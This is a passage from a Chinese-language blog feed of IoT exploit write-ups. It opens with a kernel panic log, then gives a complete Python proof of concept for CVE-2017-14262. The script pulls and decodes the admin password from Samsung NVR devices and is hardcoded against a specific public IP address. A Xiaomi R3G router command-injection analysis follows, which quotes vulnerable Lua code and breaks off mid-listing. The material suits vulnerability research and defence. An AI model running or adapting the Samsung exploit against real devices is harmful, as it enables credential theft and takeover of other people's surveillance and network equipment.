1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[18461.401153] </span><br><span class="line">[18461.406127] audit_printk_skb: 111 callbacks suppressed</span><br><span class="line">[18461.406127] type&#x3D;1400 audit(1525657115.783:1097): avc:  denied  &#123; getattr &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; path&#x3D;&quot;&#x2F;system&#x2F;bin&#x2F;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406280] type&#x3D;1400 audit(1525657115.783:1098): avc:  denied  &#123; execute &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; name&#x3D;&quot;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406524] type&#x3D;1400 audit(1525657115.783:1099): avc:  denied  &#123; read open &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; name&#x3D;&quot;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406768] type&#x3D;1400 audit(1525657115.783:1100): avc:  denied  &#123; execute_no_trans &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; path&#x3D;&quot;&#x2F;system&#x2F;bin&#x2F;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.534057] ---[ end trace f98f4a7b98572f61 ]---</span><br><span class="line">[18461.540374] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[18461.546173] CPU1: stopping</span><br><span class="line">[18461.549285] Backtrace: </span><br><span class="line">[18461.552459] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[18461.561828]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[18461.568969] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[18461.578185] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[18461.587554] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40&#x2F;0x60)</span><br><span class="line">[18461.596862] Exception stack(0xc8967fb0 to 0xc8967ff8)</span><br><span class="line">[18461.602691] 7fa0:                                     404143ed 4041294b 00000054 000012f0</span><br><span class="line">[18461.611755] 7fc0: 4028cdb4 4040e438 0000012f 4041294b 4040d148 404111d8 beb9c2e0 404275c0</span><br><span class="line">[18461.620971] 7fe0: 40416bef beb9c1f0 4009d01f 400a0ec0 000f0010 ffffffff</span><br><span class="line">[18461.628478]  r6:ffffffff r5:000f0010 r4:400a0ec0 r3:404143ed</span><br><span class="line">[18461.635559] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[18461.639617] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[18461.643798] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[18461.647857] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[18461.651916] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[18461.656097] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[18461.660156] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[18461.664215] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[18461.668395] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[18461.672454] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[18461.676513] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[18461.680694] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[18461.684753] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[18461.688812] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[18461.692871] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[18461.697051] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[18461.701110] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[18461.705169] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[18461.709381] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[18461.713409] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[18461.717498] </span><br><span class="line">[18461.719268] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[18461.719299] </span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2017-14262）Samsung NVR devices 漏洞</title>
    <url>/2020/08/06/IOT/Exploit/%E4%B8%89%E6%98%9F/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。 Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> takewhile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SamsungNVR</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    此漏洞三星和 uniview 都有</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    vul_info = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Samsung NVR设备安全漏洞&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cve&quot;</span>: <span class="string">&quot;CVE-2017-14262&quot;</span>,</span><br><span class="line">        <span class="string">&quot;desc&quot;</span>: <span class="string">&quot;Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。&quot;</span></span><br><span class="line">                <span class="string">&quot;Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pass_index = OrderedDict(</span><br><span class="line">        [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">9192090</span>, <span class="number">2</span>), (<span class="number">1020910</span>, <span class="number">3</span>), (<span class="number">25549780</span>, <span class="number">4</span>), (<span class="number">24507899</span>, <span class="number">5</span>), (<span class="number">16119889</span>, <span class="number">6</span>), (<span class="number">9428219</span>, <span class="number">7</span>), (<span class="number">2281891</span>, <span class="number">8</span>),</span><br><span class="line">         (<span class="number">10861120</span>, <span class="number">9</span>), (<span class="number">15331742</span>, <span class="number">10</span>), (<span class="number">22464897</span>, <span class="number">11</span>), (<span class="number">24403461</span>, <span class="number">12</span>), (<span class="number">13833575</span>, <span class="number">13</span>), (<span class="number">16061285</span>, <span class="number">14</span>), (<span class="number">10721046</span>, <span class="number">15</span>),</span><br><span class="line">         (<span class="number">16593252</span>, <span class="number">16</span>), (<span class="number">22051260</span>, <span class="number">17</span>), (<span class="number">16638739</span>, <span class="number">18</span>), (<span class="number">6666540</span>, <span class="number">19</span>), (<span class="number">9283102</span>, <span class="number">20</span>), (<span class="number">18791719</span>, <span class="number">21</span>), (<span class="number">25905184</span>, <span class="number">22</span>),</span><br><span class="line">         (<span class="number">2762182</span>, <span class="number">23</span>), (<span class="number">12911758</span>, <span class="number">24</span>), (<span class="number">21944959</span>, <span class="number">25</span>), (<span class="number">10257708</span>, <span class="number">26</span>), (<span class="number">894574</span>, <span class="number">27</span>), (<span class="number">16004987</span>, <span class="number">28</span>), (<span class="number">12850146</span>, <span class="number">29</span>),</span><br><span class="line">         (<span class="number">8043423</span>, <span class="number">30</span>), (<span class="number">7835618</span>, <span class="number">31</span>), (<span class="number">18372773</span>, <span class="number">32</span>), (<span class="number">9417841</span>, <span class="number">33</span>), (<span class="number">18658565</span>, <span class="number">34</span>), (<span class="number">10330028</span>, <span class="number">35</span>), (<span class="number">13289156</span>, <span class="number">36</span>),</span><br><span class="line">         (<span class="number">23739388</span>, <span class="number">37</span>), (<span class="number">12401865</span>, <span class="number">38</span>), (<span class="number">15005445</span>, <span class="number">39</span>), (<span class="number">10176399</span>, <span class="number">40</span>), (<span class="number">10776092</span>, <span class="number">41</span>), (<span class="number">16860945</span>, <span class="number">42</span>), (<span class="number">5353890</span>, <span class="number">43</span>),</span><br><span class="line">         (<span class="number">2688051</span>, <span class="number">44</span>), (<span class="number">39030</span>, <span class="number">45</span>), (<span class="number">18708319</span>, <span class="number">46</span>), (<span class="number">23920727</span>, <span class="number">47</span>), (<span class="number">4762271</span>, <span class="number">48</span>), (<span class="number">24294435</span>, <span class="number">49</span>), (<span class="number">16720763</span>, <span class="number">50</span>),</span><br><span class="line">         (<span class="number">21207445</span>, <span class="number">51</span>), (<span class="number">20598600</span>, <span class="number">52</span>), (<span class="number">13303854</span>, <span class="number">53</span>), (<span class="number">2666164</span>, <span class="number">54</span>), (<span class="number">19813766</span>, <span class="number">55</span>), (<span class="number">16041010</span>, <span class="number">56</span>), (<span class="number">3127839</span>, <span class="number">57</span>),</span><br><span class="line">         (<span class="number">25260962</span>, <span class="number">58</span>), (<span class="number">15859882</span>, <span class="number">59</span>), (<span class="number">23452596</span>, <span class="number">60</span>), (<span class="number">11396657</span>, <span class="number">61</span>), (<span class="number">18994119</span>, <span class="number">62</span>), (<span class="number">12423246</span>, <span class="number">63</span>), (<span class="number">21498126</span>, <span class="number">64</span>),</span><br><span class="line">         (<span class="number">23593931</span>, <span class="number">65</span>), (<span class="number">9818447</span>, <span class="number">66</span>), (<span class="number">14937061</span>, <span class="number">67</span>), (<span class="number">24683641</span>, <span class="number">68</span>), (<span class="number">11058089</span>, <span class="number">69</span>), (<span class="number">12800298</span>, <span class="number">70</span>), (<span class="number">133183</span>, <span class="number">71</span>),</span><br><span class="line">         (<span class="number">26013724</span>, <span class="number">72</span>), (<span class="number">19021449</span>, <span class="number">73</span>), (<span class="number">25487361</span>, <span class="number">74</span>), (<span class="number">3426696</span>, <span class="number">75</span>), (<span class="number">22326185</span>, <span class="number">76</span>), (<span class="number">9151922</span>, <span class="number">77</span>), (<span class="number">20416123</span>, <span class="number">78</span>),</span><br><span class="line">         (<span class="number">13876302</span>, <span class="number">79</span>), (<span class="number">497003</span>, <span class="number">80</span>), (<span class="number">18662430</span>, <span class="number">81</span>), (<span class="number">7306818</span>, <span class="number">82</span>), (<span class="number">24323487</span>, <span class="number">83</span>), (<span class="number">26110937</span>, <span class="number">84</span>),</span><br><span class="line">         (<span class="number">5380058</span>, <span class="number">85</span>), (<span class="number">21481095</span>, <span class="number">86</span>), (<span class="number">9540458</span>, <span class="number">87</span>), (<span class="number">14123621</span>, <span class="number">88</span>), (<span class="number">6847253</span>, <span class="number">89</span>), (<span class="number">7638896</span>, <span class="number">90</span>),</span><br><span class="line">         (<span class="number">22385568</span>, <span class="number">91</span>), (<span class="number">1208753</span>, <span class="number">92</span>), (<span class="number">15383366</span>, <span class="number">93</span>), (<span class="number">24719837</span>, <span class="number">94</span>), (<span class="number">26729699</span>, <span class="number">95</span>), (<span class="number">3594142</span>, <span class="number">96</span>),</span><br><span class="line">         (<span class="number">371291</span>, <span class="number">97</span>), (<span class="number">23345327</span>, <span class="number">98</span>), (<span class="number">4415431</span>, <span class="number">99</span>), (<span class="number">6477625</span>, <span class="number">100</span>), (<span class="number">4733341</span>, <span class="number">101</span>), (<span class="number">13423221</span>, <span class="number">102</span>),</span><br><span class="line">         (<span class="number">24215867</span>, <span class="number">103</span>), (<span class="number">7503741</span>, <span class="number">104</span>), (<span class="number">6390751</span>, <span class="number">105</span>), (<span class="number">10192199</span>, <span class="number">106</span>), (<span class="number">10352855</span>, <span class="number">107</span>), (<span class="number">22393893</span>, <span class="number">108</span>),</span><br><span class="line">         (<span class="number">7198498</span>, <span class="number">109</span>), (<span class="number">12838108</span>, <span class="number">110</span>), (<span class="number">5515125</span>, <span class="number">111</span>), (<span class="number">7229843</span>, <span class="number">112</span>), (<span class="number">13872090</span>, <span class="number">113</span>), (<span class="number">21671745</span>, <span class="number">114</span>),</span><br><span class="line">         (<span class="number">12457317</span>, <span class="number">115</span>), (<span class="number">26153875</span>, <span class="number">116</span>), (<span class="number">14327497</span>, <span class="number">117</span>), (<span class="number">11382568</span>, <span class="number">118</span>), (<span class="number">10132668</span>, <span class="number">119</span>), (<span class="number">20086929</span>, <span class="number">120</span>),</span><br><span class="line">         (<span class="number">8117696</span>, <span class="number">121</span>), (<span class="number">2098389</span>, <span class="number">122</span>), (<span class="number">21553350</span>, <span class="number">123</span>), (<span class="number">23391670</span>, <span class="number">124</span>), (<span class="number">25350683</span>, <span class="number">125</span>), (<span class="number">25970062</span>, <span class="number">126</span>),</span><br><span class="line">         (<span class="number">6959731</span>, <span class="number">127</span>), (<span class="number">16338714</span>, <span class="number">128</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_password</span>(<span class="params">cls, json_resp</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;解密管理员账户密码&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            au_pwd = takewhile(<span class="keyword">lambda</span> x: x != <span class="number">0</span>, json_resp[<span class="string">&quot;au32LoginPasswd&quot;</span>])</span><br><span class="line">            password = <span class="string">&quot;&quot;</span>.join(chr(cls.pass_index[pwd_int]) <span class="keyword">for</span> pwd_int <span class="keyword">in</span> au_pwd)</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ip: str, port: int</span>):</span></span><br><span class="line">        self._base_url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        vul_path = <span class="string">&#x27;/cgi-bin/main-cgi?json=&#123;&quot;cmd&quot;:201,&quot;szUserName_Qry&quot;:&quot;admin&quot;,&quot;szUserName&quot;:&quot;&quot;,&quot;u32UserLoginHandle&quot;:0&#125;&#x27;</span></span><br><span class="line">        url = self._base_url + vul_path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">                res_json = req.json()</span><br><span class="line">                hash_pass = res_json.get(<span class="string">&quot;szLoginPasswd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> hash_pass:</span><br><span class="line">                    plain_pass = self.decrypt_password(res_json)</span><br><span class="line">                    <span class="keyword">if</span> plain_pass:</span><br><span class="line">                        <span class="keyword">return</span> &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: plain_pass&#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    vul = SamsungNVR(<span class="string">&quot;117.158.178.49&quot;</span>, <span class="number">84</span>)</span><br><span class="line">    vulres = vul.verify()</span><br><span class="line">    print(<span class="string">f&quot;[-] <span class="subst">&#123;vul.vul_info&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> vulres:</span><br><span class="line">        print(<span class="string">f&quot;[+] 存在漏洞:<span class="subst">&#123;vulres&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] 不存在漏洞。&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>三星</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-18370)Xiaomi Mi WiFi R3G 远程命令执行漏洞</title>
    <url>/2020/09/12/IOT/Exploit/%E5%B0%8F%E7%B1%B3/CVE-2019-18370-Xiaomi-Mi-WiFi-R3G-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Xiaomi Mi WiFi R3G 2.28.23-stable之前版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>备份文件是<code>tar.gz</code>格式的，上传后<code>tar zxf</code>解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。</p>
<p>备份文件解压导致<code>/tmp/</code>目录任意文件可控</p>
<p>在<code>/usr/lib/lua/luci/controller/api/misystem.lua</code>中，配置文件功能如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cUpload</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> LuciFs = <span class="built_in">require</span>(<span class="string">&quot;luci.fs&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> XQBackup = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.module.XQBackup&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> canupload = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">local</span> uploadFilepath = <span class="string">&quot;/tmp/cfgbackup.tar.gz&quot;</span></span><br><span class="line">    <span class="keyword">local</span> fileSize = <span class="built_in">tonumber</span>(LuciHttp.<span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> fileSize &gt; <span class="number">102400</span> <span class="keyword">then</span></span><br><span class="line">        canupload = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    LuciHttp.setfilehandler(</span><br><span class="line">        <span class="function"><span class="keyword">function</span><span class="params">(meta, chunk, eof)</span></span></span><br><span class="line">            <span class="keyword">if</span> canupload <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> fp <span class="keyword">then</span></span><br><span class="line">                    <span class="keyword">if</span> meta <span class="keyword">and</span> meta.name == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">                        fp = <span class="built_in">io</span>.<span class="built_in">open</span>(uploadFilepath, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line">                    fp:<span class="built_in">write</span>(chunk)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">if</span> eof <span class="keyword">then</span></span><br><span class="line">                    fp:<span class="built_in">close</span>()</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                code = <span class="number">1630</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> LuciHttp.formvalue(<span class="string">&quot;image&quot;</span>) <span class="keyword">and</span> fp <span class="keyword">then</span></span><br><span class="line">        code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> ext = XQBackup.extract(uploadFilepath)</span><br><span class="line">        <span class="keyword">if</span> ext == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            result[<span class="string">&quot;des&quot;</span>] = XQBackup.getdes()</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1629</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        result[<span class="string">&quot;msg&quot;</span>] = XQErrorUtil.getErrorMessage(code)</span><br><span class="line">        LuciFs.unlink(uploadFilepath)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = code</span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>其中调用<code>XQBackup.extract(uploadFilepath)</code>进行解压</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 0:succeed</span></span><br><span class="line"><span class="comment">-- 1:file does not exist</span></span><br><span class="line"><span class="comment">-- 2:no description file</span></span><br><span class="line"><span class="comment">-- 3:no mbu file</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extract</span><span class="params">(filepath)</span></span></span><br><span class="line">    <span class="keyword">local</span> fs = <span class="built_in">require</span>(<span class="string">&quot;nixio.fs&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tarpath = filepath</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tarpath <span class="keyword">then</span></span><br><span class="line">        tarpath = TARMBUFILE</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(tarpath) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;cd /tmp; tar -xzf &quot;</span>..tarpath..<span class="string">&quot; &gt;/dev/null 2&gt;/dev/null&quot;</span>)</span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;rm &quot;</span>..tarpath..<span class="string">&quot; &gt;/dev/null 2&gt;/dev/null&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(DESFILE) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(MBUFILE) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可知，<code>/tmp</code>目录下的任意文件可控</p>
<blockquote>
<p>/usr/bin/upload_speedtest,/usr/bin/download_speedtest<code>等会读取</code>/tmp/speedtest_urls.xml`并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用</p>
</blockquote>
<p>举例，查看<code>/usr/bin/download_speedtest</code>文件</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env lua</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="keyword">local</span> cfg = &#123;</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line">	[<span class="string">&#x27;xmlfile&#x27;</span>] = <span class="string">&quot;/usr/share/speedtest.xml&quot;</span>,</span><br><span class="line">        [<span class="string">&#x27;tmp_speedtest_xml&#x27;</span>] = <span class="string">&quot;/tmp/speedtest_urls.xml&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">VERSION=<span class="string">&quot;__UNDEFINED__&quot;</span></span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="comment">-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xml</span></span><br><span class="line"><span class="keyword">local</span> filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filexml = <span class="built_in">io</span>.<span class="built_in">open</span>(cfg.tmp_speedtest_xml)</span><br><span class="line"><span class="keyword">if</span> filexml <span class="keyword">then</span></span><br><span class="line">    filexml:<span class="built_in">close</span>()</span><br><span class="line">    filename = cfg.tmp_speedtest_xml</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    filename = cfg.xmlfile</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> pp = <span class="built_in">io</span>.<span class="built_in">open</span>(filename)</span><br><span class="line"><span class="keyword">local</span> line = pp:<span class="built_in">read</span>(<span class="string">&quot;*line&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> size = <span class="number">0</span></span><br><span class="line"><span class="keyword">local</span> resources = &#123;&#125;</span><br><span class="line"><span class="keyword">local</span> u = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">local</span> pids = &#123;&#125;</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wget_work</span><span class="params">(url)</span></span></span><br><span class="line">	<span class="keyword">local</span> _url = url</span><br><span class="line">	pid = posix.fork()</span><br><span class="line">	<span class="keyword">if</span> pid &lt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;fork error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	<span class="keyword">elseif</span> pid &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		<span class="comment">--print(string.format(&quot;child pid %d\n&quot;, pid))</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- 拼接命令，最终在这里执行</span></span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&#x27;for i in $(seq &#x27;</span>.. <span class="built_in">math</span>.<span class="built_in">floor</span>(cfg.nr/cfg.nc) ..<span class="string">&#x27;); do wget &#x27;</span>.. url  ..</span><br><span class="line">		<span class="string">&quot; -q -O /dev/null; done&quot;</span>)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">return</span> pid</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> line <span class="keyword">do</span></span><br><span class="line">    <span class="comment">-- 从文件中提取url， 这里提取没有进行过滤</span></span><br><span class="line">	<span class="keyword">local</span> _, _, url = <span class="built_in">string</span>.<span class="built_in">find</span>(line,<span class="string">&#x27;&lt;item url=&quot;(.*)&quot;/&gt;&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">table</span>.<span class="built_in">insert</span>(resources, url)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	line = pp:<span class="built_in">read</span>(<span class="string">&quot;*line&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">pp:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> urls = mrandom(<span class="number">1</span>, <span class="built_in">table</span>.<span class="built_in">getn</span>(resources), cfg.nc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(urls) <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">if</span> VERSION == <span class="string">&quot;LESSMEM&quot;</span> <span class="keyword">then</span></span><br><span class="line">		<span class="keyword">local</span> pid = wget_work_loop(resources[v])</span><br><span 